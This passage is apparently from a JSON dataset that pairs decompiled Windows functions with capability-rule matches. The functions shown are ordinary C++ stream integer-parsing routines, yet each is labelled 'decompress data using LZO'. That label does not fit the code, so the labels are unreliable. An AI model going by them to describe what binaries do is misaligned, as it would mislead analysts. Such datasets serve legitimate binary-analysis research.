code_r0x00468c3f;\ncode_r0x00468e80:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00468c4c;\n                        var_32h = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar3 = arg_10h != NULL && arg_14h == -1;\n                    var_3ch._0_1_ = arg_14h == -1;\n                    if ((bVar3) && (var_3ch._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar9 = (**(*arg_10h + 0x24))();\n                        var_3ch._0_1_ = false;\n                        if (iVar9 == -1) {\n                            arg_10h = NULL;\n                            var_3ch._0_1_ = bVar3;\n                        }\n                    }\n                    if (var_3ch == var_32h) {\n                        var_32h = 1;\n                        goto code_r0x00468a30;\n                    }\n                    uVar8 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                            if (uVar8 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar8 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (var_31h == false) break;\n                    cVar5 = *(iVar6 + 0x10);\n                }\n                var_32h = 0;\n            }\ncode_r0x00468a30:\n            var_3ch = 0x16;\n            if (var_30h != 0x10) goto code_r0x00468a3c;\n        }\n        else {\n            uVar8 = 0;\n            var_38h = 0;\n            var_31h = false;\n            bVar11 = false;\ncode_r0x00468a3c:\n            var_3ch = var_30h;\n        }\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        var_58h = var_30h;\n        if (*(iVar6 + 0x10) != '\\0') {\ncode_r0x00469070:\n            fcn.0048c930(0x20);\n            var_58h = var_30h;\n        }\n        uVar2 = var_32h;\n        var_40h = &arg_10h;\n        var_48h = bVar11 + 0x7fffffff;\n        var_4ch = var_48h / var_58h;\n        var_33h = *(iVar6 + 100);\n        if (var_33h == 0) {\n            if (var_32h == 0) {\n                var_33h = var_32h;\n                var_30h = 0;\n                do {\n                    cVar5 = uVar8;\n                    iVar9 = cVar5;\n                    if (var_3ch < 0xb) {\n                        if ((cVar5 < '0') || (var_3ch + '0' <= cVar5)) goto code_r0x00468ef4;\ncode_r0x00468ad3:\n                        iVar9 = iVar9 + -0x30;\n                    }\n                    else {\n                        if (cVar5 - 0x30U < 10) goto code_r0x00468ad3;\n                        if (cVar5 + 0x9fU < 6) {\n                            iVar9 = iVar9 + -0x57;\n                        }\n                        else {\n                            if (5 < cVar5 + 0xbfU) goto code_r0x00468ef4;\n                            iVar9 = iVar9 + -0x37;\n                        }\n                    }\n                    if (iVar9 == -1) goto code_r0x00468ef4;\n                    if (var_4ch < var_30h) {\n                        var_33h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x00468f96;\ncode_r0x00468b13:\n                        arg_8h[2] = uVar7 + 1;\n                    }\n                    else {\n                        uVar7 = var_30h * var_58h;\n                        var_30h = iVar9 + uVar7;\n                        var_33h = var_33h | var_48h - iVar9 < uVar7;\n                        uVar7 = arg_8h[2];\n                        var_38h = var_38h + 1;\n                        if (uVar7 < arg_8h[3]) goto code_r0x00468b13;\ncode_r0x00468f96:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 0xffffffff;\n                    uVar2 = fcn.004502d0(var_40h);\n                    if (uVar2 != 0) goto code_r0x00468b3b;\n                    uVar8 = fcn.004503c0();\n                } while( true );\n            }\n            var_30h = 0;\n            var_32h = 0;\n            goto code_r0x00468b3b;\n        }\ncode_r0x00468d20:\n        uVar2 = var_32h;\n        var_40h = &arg_10h;\n        if (var_32h != 0) {\n            var_30h = 0;\n            var_33h = 0;\n            var_32h = 0;\n            goto code_r0x00468b3b;\n        }\n        uVar4 = *(iVar6 + 0x10);\n        var_33h = 0;\n        var_30h = 0;\n        if ((uVar4 != 0) && (*(iVar6 + 0x25) == uVar8)) goto code_r0x00468df8;\ncode_r0x00468d49:\n        if ((uVar8 != *(iVar6 + 0x24)) && (iVar9 = sub.msvcrt.dll_memchr(iVar6 + 0x4e, uVar8, var_3ch),  iVar9 != 0)) {\n            iVar9 = iVar9 - (iVar6 + 0x4e);\n            if (0xf < iVar9) {\n                iVar9 = iVar9 + -6;\n            }\n            if (var_4ch < var_30h) {\n                var_33h = 1;\n            }\n            else {\n                uVar7 = var_30h * var_58h;\n                var_30h = iVar9 + uVar7;\n                var_33h = var_33h | var_48h - iVar9 < uVar7;\n                var_38h = var_38h + 1;\n            }\n            uVar7 = arg_8h[2];\n            if (arg_8h[3] <= uVar7) goto code_r0x00468e26;\n            do {\n                arg_8h[2] = uVar7 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    uVar2 = fcn.004502d0(var_40h);\n                    if (uVar2 != 0) goto code_r0x00468b3b;\n                    uVar8 = fcn.004503c0();\n                    uVar4 = *(iVar6 + 0x10);\n                    if ((uVar4 == 0) || (*(iVar6 + 0x25) != uVar8)) goto code_r0x00468d49;\ncode_r0x00468df8:\n                    if (var_38h == 0) {\n                        uVar2 = 0;\n                        var_32h = uVar4;\n                        goto code_r0x00468b3b;\n                    }\n                    fcn.0048cc10(var_38h);\n                    var_38h = 0;\n                    uVar7 = arg_8h[2];\n                    if (uVar7 < arg_8h[3]) break;\ncode_r0x00468e26:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x00468ef4:\n        uVar2 = 0;\n        uVar4 = 0;\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00468f04;\ncode_r0x00468b49:\n        if ((var_38h != 0) || (var_31h == 1)) {\ncode_r0x00468f51:\n            if (var_32h == 0) {\n                if (var_33h == 0) {\n                    uVar7 = -var_30h;\n                    if (!bVar11) {\n                        uVar7 = var_30h;\n                    }\n                    *arg_20h = uVar7;\n                }\n                else {\n                    *arg_20h = bVar11 + 0x7fffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x00468b70;\n            }\n        }\n    }\n    else {\n        var_30h = 10;\n        if (uVar7 != 8) goto code_r0x0046899f;\n        var_30h = 0x10;\n        uVar2 = fcn.004502d0(&arg_10h);\n        if (uVar2 == 0) goto code_r0x004689be;\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        uVar4 = *(iVar6 + 0x10);\n        if (uVar4 != 0) {\n            var_38h = 0;\n            uVar8 = 0;\n            var_31h = false;\n            bVar11 = false;\n            var_3ch = 0x16;\n            var_32h = uVar4;\n            goto code_r0x00469070;\n        }\n        var_32h = *(iVar6 + 100);\n        bVar11 = false;\n        if (var_32h != 0) {\n            var_3ch = 0x16;\n            uVar8 = 0;\n            var_4ch = 0x7ffffff;\n            var_48h = 0x7fffffff;\n            var_38h = 0;\n            var_58h = 0x10;\n            var_31h = uVar4;\n            goto code_r0x00468d20;\n        }\n        var_33h = 0;\n        var_30h = 0;\n        var_38h = 0;\n        var_31h = var_32h;\ncode_r0x00468b3b:\n        uVar4 = uVar2;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00468b49;\ncode_r0x00468f04:\n        uVar2 = uVar4;\n        fcn.0048cc10(var_38h);\n        cVar5 = fcn.004bdf60(*(iVar6 + 8), *(iVar6 + 0xc), &var_1eh + 2);\n        if (cVar5 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_38h != 0) || (var_31h == 1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00468f51;\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00468b70:\n    var_54h = &var_1eh + 1;\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(var_54h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3994
    },
    "004691d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004691d0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint s;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar12 = arg_18h;\n    iVar9 = fcn.0044da00(arg_18h + 0x6c);\n    uVar10 = *(iVar12 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x00469210:\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x0046922f:\n            var_44h = &arg_10h;\n            uVar11 = fcn.004503c0();\n            cVar6 = uVar11;\n            bVar15 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar15) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.004502d0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.004503c0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x0046943c;\n                }\n            }\n            else {\ncode_r0x0046943c:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x00469479;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x004694ad;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x00469550;\ncode_r0x004694bc:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x004694c9:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar12 = (**(*arg_8h + 0x24))(),  iVar12 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00469479:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x004692a1;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x004692ae;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x004694ad:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x004694bc;\ncode_r0x00469550:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x004694c9;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar12 = (**(*arg_10h + 0x24))();\n                        if (iVar12 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x004692a1;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x004692a1:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x004692b4;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar15 = false;\n        }\ncode_r0x004692ae:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x00469210;\n        }\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x0046922f;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar15 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x004692b4:\n    var_44h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar10 = 0xffffffff / var_38h;\n    uVar1 = *(iVar9 + 100);\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            uVar13 = 0;\n            do {\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x004695c4;\ncode_r0x00469331:\n                    uVar11 = iVar12 - 0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x00469331;\n                    if (cVar6 + 0x9fU < 6) {\n                        uVar11 = iVar12 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x004695c4;\n                        uVar11 = iVar12 - 0x37;\n                    }\n                }\n                if (uVar11 == 0xffffffff) goto code_r0x004695c4;\n                if (uVar10 < uVar13) {\n                    var_45h = 1;\n                    uVar11 = arg_8h[2];\n                    if (arg_8h[3] <= uVar11) goto code_r0x00469663;\ncode_r0x0046936b:\n                    arg_8h[2] = uVar11 + 1;\n                }\n                else {\n                    uVar14 = uVar13 * var_38h;\n                    uVar13 = uVar14 + uVar11;\n                    var_45h = var_45h | ~uVar11 < uVar14;\n                    uVar11 = arg_8h[2];\n                    var_34h = var_34h + 1;\n                    if (uVar11 < arg_8h[3]) goto code_r0x0046936b;\ncode_r0x00469663:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.004502d0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x00469393;\n                uVar11 = fcn.004503c0();\n            } while( true );\n        }\n        uVar13 = 0;\n        cVar8 = '\\0';\ncode_r0x00469393:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x004693a1;\ncode_r0x004695d4:\n        cVar6 = cVar3;\n        fcn.0048cc10(var_34h);\n        cVar8 = fcn.004bdf60(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00469622;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar13 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x00469393;\n        }\n        var_45h = 0;\n        uVar13 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x004697d0;\ncode_r0x00469727:\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            uVar11 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < uVar11) {\n                uVar11 = uVar11 - 6;\n            }\n            uVar4 = uVar1;\n            if (uVar13 <= uVar10) {\n                uVar14 = uVar13 * var_38h;\n                var_34h = var_34h + 1;\n                uVar13 = uVar14 + uVar11;\n                uVar4 = var_45h | ~uVar11 < uVar14;\n            }\n            var_45h = uVar4;\n            uVar11 = arg_8h[2];\n            if (arg_8h[3] <= uVar11) goto code_r0x004697fe;\n            do {\n                arg_8h[2] = uVar11 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.004502d0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x00469393;\n                    uVar11 = fcn.004503c0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x00469727;\ncode_r0x004697d0:\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x00469393;\n                    }\n                    fcn.0048cc10(var_34h);\n                    var_34h = 0;\n                    uVar11 = arg_8h[2];\n                    if (uVar11 < arg_8h[3]) break;\ncode_r0x004697fe:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x004695c4:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x004695d4;\ncode_r0x004693a1:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x00469622:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar15) {\n                        uVar13 = -uVar13;\n                    }\n                    *arg_20h = uVar13;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x004693c8;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x004693c8:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3599
    },
    "00469960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00469960(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint8_t uVar4;\n    char cVar5;\n    char cVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t uVar14;\n    int32_t iVar15;\n    bool bVar16;\n    uint var_50h;\n    uint var_4ch;\n    uint8_t var_45h;\n    uint *var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar15 = arg_18h;\n    iVar9 = fcn.0044da00(arg_18h + 0x6c);\n    uVar10 = *(iVar15 + 0xc) & 0x4a;\n    if (uVar10 == 0x40) {\n        var_38h = 8;\ncode_r0x004699a0:\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\ncode_r0x004699bf:\n            var_44h = &arg_10h;\n            uVar11 = fcn.004503c0();\n            cVar6 = uVar11;\n            bVar16 = *(iVar9 + 0x4a) == cVar6;\n            cVar5 = *(iVar9 + 0x10);\n            if ((((bVar16) || (*(iVar9 + 0x4b) == cVar6)) && ((cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)))) &&\n               (*(iVar9 + 0x24) != cVar6)) {\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                cVar5 = fcn.004502d0(var_44h);\n                var_34h = 0;\n                bVar2 = false;\n                if (cVar5 == '\\0') {\n                    uVar11 = fcn.004503c0();\n                    cVar5 = *(iVar9 + 0x10);\n                    goto code_r0x00469bd1;\n                }\n            }\n            else {\ncode_r0x00469bd1:\n                var_34h = 0;\n                bVar2 = false;\n                while (((cVar6 = uVar11,  cVar5 == '\\0' || (*(iVar9 + 0x25) != cVar6)) && (*(iVar9 + 0x24) != cVar6))) {\n                    if (*(iVar9 + 0x4e) == cVar6) {\n                        bVar7 = var_38h == 10 | bVar2 ^ 1U;\n                        if (!bVar7) goto code_r0x00469c0d;\n                        bVar2 = uVar10 == 0 || var_38h == 8;\n                        if (uVar10 != 0 && var_38h != 8) {\n                            var_34h = var_34h + 1;\n                            goto code_r0x00469c41;\n                        }\n                        var_34h = 0;\n                        var_38h = 8;\n                        uVar13 = arg_8h[2];\n                        if (arg_8h[3] <= uVar13) goto code_r0x00469cf0;\ncode_r0x00469c50:\n                        arg_8h[2] = uVar13 + 1;\ncode_r0x00469c5d:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar15 = (**(*arg_8h + 0x24))(),  iVar15 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar2) break;\ncode_r0x00469c0d:\n                        if ((*(iVar9 + 0x4c) != cVar6) && (*(iVar9 + 0x4d) != cVar6)) {\n                            cVar5 = '\\0';\n                            bVar2 = true;\n                            goto code_r0x00469a31;\n                        }\n                        cVar5 = var_38h == 0x10 || uVar10 == 0;\n                        if (var_38h != 0x10 && uVar10 != 0) {\n                            bVar2 = true;\n                            goto code_r0x00469a3e;\n                        }\n                        var_34h = 0;\n                        var_38h = 0x10;\n                        bVar7 = false;\ncode_r0x00469c41:\n                        uVar13 = arg_8h[2];\n                        bVar2 = bVar7;\n                        if (uVar13 < arg_8h[3]) goto code_r0x00469c50;\ncode_r0x00469cf0:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00469c5d;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar7 = arg_10h != NULL && arg_14h == -1;\n                    var_45h = arg_14h == -1;\n                    if ((bVar7) && (var_45h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_45h = false;\n                        iVar15 = (**(*arg_10h + 0x24))();\n                        if (iVar15 == -1) {\n                            arg_10h = NULL;\n                            var_45h = bVar7;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_45h) {\n                        cVar5 = '\\x01';\n                        goto code_r0x00469a31;\n                    }\n                    uVar11 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                            if (uVar11 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar11 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar2) break;\n                    cVar5 = *(iVar9 + 0x10);\n                }\n                cVar5 = '\\0';\n            }\ncode_r0x00469a31:\n            var_40h = 0x16;\n            if (var_38h == 0x10) goto code_r0x00469a44;\n        }\n        else {\n            uVar11 = 0;\n            var_34h = 0;\n            bVar2 = false;\n            bVar16 = false;\n        }\ncode_r0x00469a3e:\n        var_40h = var_38h;\n    }\n    else {\n        if (uVar10 != 8) {\n            var_38h = 10;\n            goto code_r0x004699a0;\n        }\n        cVar5 = fcn.004502d0(&arg_10h);\n        if (cVar5 == '\\0') {\n            var_38h = 0x10;\n            goto code_r0x004699bf;\n        }\n        uVar11 = 0;\n        var_34h = 0;\n        bVar2 = false;\n        bVar16 = false;\n        var_38h = 0x10;\n        var_40h = 0x16;\n    }\ncode_r0x00469a44:\n    var_44h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar9 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar1 = *(iVar9 + 100);\n    var_4ch._0_2_ = 0xffff / var_38h;\n    cVar6 = cVar5;\n    if (uVar1 == 0) {\n        var_45h = 0;\n        if (cVar5 == '\\0') {\n            iVar15 = 0;\n            do {\n                uVar14 = iVar15;\n                cVar6 = uVar11;\n                iVar12 = cVar6;\n                if (var_40h < 0xb) {\n                    if ((cVar6 < '0') || (var_40h + '0' <= cVar6)) goto code_r0x00469d64;\ncode_r0x00469ac0:\n                    iVar12 = iVar12 + -0x30;\n                }\n                else {\n                    if (cVar6 - 0x30U < 10) goto code_r0x00469ac0;\n                    if (cVar6 + 0x9fU < 6) {\n                        iVar12 = iVar12 + -0x57;\n                    }\n                    else {\n                        if (5 < cVar6 + 0xbfU) goto code_r0x00469d64;\n                        iVar12 = iVar12 + -0x37;\n                    }\n                }\n                if (iVar12 == -1) goto code_r0x00469d64;\n                if (var_4ch < uVar14) {\n                    var_45h = 1;\n                    uVar10 = arg_8h[2];\n                    if (arg_8h[3] <= uVar10) goto code_r0x00469e03;\ncode_r0x00469b02:\n                    arg_8h[2] = uVar10 + 1;\n                }\n                else {\n                    iVar15 = uVar14 * var_38h + iVar12;\n                    var_45h = var_45h | 0xffff - iVar12 < uVar14 * var_38h;\n                    var_34h = var_34h + 1;\n                    uVar10 = arg_8h[2];\n                    if (uVar10 < arg_8h[3]) goto code_r0x00469b02;\ncode_r0x00469e03:\n                    (**(*arg_8h + 0x28))();\n                }\n                uVar14 = iVar15;\n                arg_ch = 0xffffffff;\n                cVar6 = fcn.004502d0(var_44h);\n                cVar8 = cVar5;\n                if (cVar6 != '\\0') goto code_r0x00469b2a;\n                uVar11 = fcn.004503c0();\n            } while( true );\n        }\n        uVar14 = 0;\n        cVar8 = '\\0';\ncode_r0x00469b2a:\n        cVar3 = cVar6;\n        cVar5 = cVar8;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x00469b38;\ncode_r0x00469d74:\n        cVar6 = cVar3;\n        fcn.0048cc10(var_34h);\n        cVar8 = fcn.004bdf60(*(iVar9 + 8), *(iVar9 + 0xc), &var_1eh + 2);\n        if (cVar8 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_34h != 0) || (bVar2)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x00469dc2;\n    }\n    else {\n        if (cVar5 != '\\0') {\n            uVar14 = 0;\n            var_45h = 0;\n            cVar8 = '\\0';\n            goto code_r0x00469b2a;\n        }\n        var_45h = 0;\n        iVar15 = 0;\n        cVar8 = *(iVar9 + 0x10);\n        if ((cVar8 != '\\0') && (*(iVar9 + 0x25) == uVar11)) goto code_r0x00469f78;\ncode_r0x00469ec7:\n        uVar14 = iVar15;\n        if ((uVar11 != *(iVar9 + 0x24)) && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x4e, uVar11, var_40h),  iVar12 != 0)\n           ) {\n            iVar12 = iVar12 - (iVar9 + 0x4e);\n            if (0xf < iVar12) {\n                iVar12 = iVar12 + -6;\n            }\n            uVar4 = uVar1;\n            if (uVar14 <= var_4ch) {\n                var_34h = var_34h + 1;\n                iVar15 = uVar14 * var_38h + iVar12;\n                uVar4 = var_45h | 0xffff - iVar12 < uVar14 * var_38h;\n            }\n            var_45h = uVar4;\n            uVar10 = arg_8h[2];\n            if (arg_8h[3] <= uVar10) goto code_r0x00469fa6;\n            do {\n                arg_8h[2] = uVar10 + 1;\n                while( true ) {\n                    uVar14 = iVar15;\n                    arg_ch = 0xffffffff;\n                    cVar6 = fcn.004502d0(var_44h);\n                    cVar8 = cVar5;\n                    if (cVar6 != '\\0') goto code_r0x00469b2a;\n                    uVar11 = fcn.004503c0();\n                    cVar8 = *(iVar9 + 0x10);\n                    if ((cVar8 == '\\0') || (*(iVar9 + 0x25) != uVar11)) goto code_r0x00469ec7;\ncode_r0x00469f78:\n                    uVar14 = iVar15;\n                    if (var_34h == 0) {\n                        cVar6 = '\\0';\n                        goto code_r0x00469b2a;\n                    }\n                    fcn.0048cc10(var_34h);\n                    var_34h = 0;\n                    uVar10 = arg_8h[2];\n                    if (uVar10 < arg_8h[3]) break;\ncode_r0x00469fa6:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x00469d64:\n        cVar6 = '\\0';\n        cVar3 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x00469d74;\ncode_r0x00469b38:\n        if ((var_34h != 0) || (bVar2)) {\ncode_r0x00469dc2:\n            if (cVar5 == '\\0') {\n                if (var_45h == 0) {\n                    if (bVar16) {\n                        uVar14 = -uVar14;\n                    }\n                    *arg_20h = uVar14;\n                }\n                else {\n                    *arg_20h = 0xffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x00469b5e;\n            }\n        }\n    }\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00469b5e:\n    if (cVar6 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3675
    },
    "0046a110": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
